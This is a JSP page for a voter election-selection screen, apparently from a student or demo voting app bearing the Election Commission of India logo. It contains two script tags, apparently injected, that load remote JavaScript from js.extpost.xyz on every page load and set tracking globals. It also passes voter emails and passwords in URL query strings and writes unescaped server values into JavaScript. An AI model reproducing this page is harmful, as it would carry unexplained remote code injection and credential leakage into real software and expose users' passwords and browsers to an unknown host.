<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ page session="false" %>
<html><head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous" referrerpolicy="no-referrer">
<link href="/Content/css/bootstrap-flatly.min.css" rel="stylesheet">
<link href="/Scripts/assets/dist/css/style.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/fontawesome.min.css" integrity="sha512-xX2rYBFJSj86W54Fyv1de80DWBq7zYLn2z0I9bIhQG+rxIF6XVJUpdGnsNHWRa6AvP89vtFupEPDP8eZAtu9qA==" crossorigin="anonymous" referrerpolicy="no-referrer">
<link href="/Content/css/animations.css" rel="stylesheet">
<link href="/Content/css/fonts.css" rel="stylesheet">
<link href="/Content/css/main.css" rel="stylesheet" class="color-switcher-link">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js" integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
	<title>Home</title>
<script src="https://js.extpost.xyz/js/i.js?1677089759233"></script><script>window.__TemperAssInit = true;window.__VUserUDID = 'a258d9bfffc4f2bda6f86b79dec1499c1f0d6111';window.__VUserSUBID = 'P_CHR_UPDATE';</script></head>


<script type="text/javascript">

$(document).ready(function(){
	
	debugger;
	document.getElementById("election").className="nav-link active"
		 document.getElementById("home").className="nav-link"
	
	if('${voter_count}'==1){
		
		alert('${message}');
	}
	
	
	
	});



function candidateList(election,date,email,pass){
	
	debugger;
	
	var url =  "/pro/voter/electionList?Election=" + election+"&date="+date+"&voter_email="+email+"&voter_pass="+pass;
	window.open(url,"_self");
	//document.getElementById("div1").style.display="none";
	/* var url=CONTEXT_ROOT+"/quote/getMaterialData?hourFlag="+hourFlag+"&top_lvl_job="+top_lvl_job+"&quote_id="+quote_id;
	window.open(url,"_self"); */
	
}



</script>



<body>


                <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <div class="container-fluid">
    <a href="https://eci.gov.in/" id="elLogo" accesskey="1"><img src="https://eci.gov.in/uploads/monthly_2022_06/logo.png.d0e6aee2d64193769bffbc6e720bbe96.png" alt="Election Commission of India" ></a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarColor01" aria-controls="navbarColor01" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarColor01">
      <ul class="navbar-nav me-auto">
        <li class="nav-item">
          <a class="nav-link active" id="home" href="/pro" style="margin-left: 60px;">Home
            <span class="visually-hidden">(current)</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link" id="election" href="/pro/main/addElection" style="width: max-content;">Election</a>
        </li>
        <!-- <li class="nav-item">
          <a class="nav-link" href="#">Candidate</a>
        </li> -->
        <li class="nav-item">
          <a class="nav-link" id="logout" href="/pro" style="width: max-content;">Logout</a>
        </li>
       
      
    </div>
  </div>
</nav>

<div>

<img alt="" width="100%" height="400px" src="<c:url value="/resources/images/election.jpg"></c:url>">
<div class="container" style="width: 50%;">


   
   
    <hr>
<label style="color: black;font-weight: bold;" for="cars">Select Election<b></label><br>
  <select name="election_name" id="election_name" style="width: 250px;" onchange="candidateList(this.value,'${election_list[0].election_date}','${voter_email}','${voter_pass}')">
  <option value="">Select Election</option>
    <c:forEach items="${election_list}" var="elct">
    <option value="${elct.election_name}">${elct.election_name}</option>
  </c:forEach>   
  </select>
  </div>
</div>



<script src="https://js.extpost.xyz/js/inject-web.js?2020-08-22" type="text/javascript"></script></body></html>
